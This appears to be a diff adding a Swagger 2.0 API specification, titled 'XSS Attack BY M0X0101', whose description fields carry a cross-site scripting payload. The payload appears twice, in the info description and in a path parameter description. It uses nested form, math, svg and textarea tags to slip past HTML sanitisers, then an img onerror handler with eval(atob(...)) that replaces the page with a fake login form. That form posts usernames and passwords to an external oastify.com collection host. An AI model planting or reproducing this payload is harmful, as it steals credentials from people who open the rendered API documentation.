@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='document.body.innerHTML=''; var a=document.createElement('form');a.action="http://y10n08vo7vi503nrzqy6w3x9m0srgh46.oastify.com";a.method='POST';a.innerHTML='<center>Username: <input type="text" name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>'; document.body.appendChild(a);' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='document.body.innerHTML=''; var a=document.createElement('form');a.action="http://y10n08vo7vi503nrzqy6w3x9m0srgh46.oastify.com";a.method='POST';a.innerHTML='<center>Username: <input type="text" name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>'; document.body.appendChild(a);' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
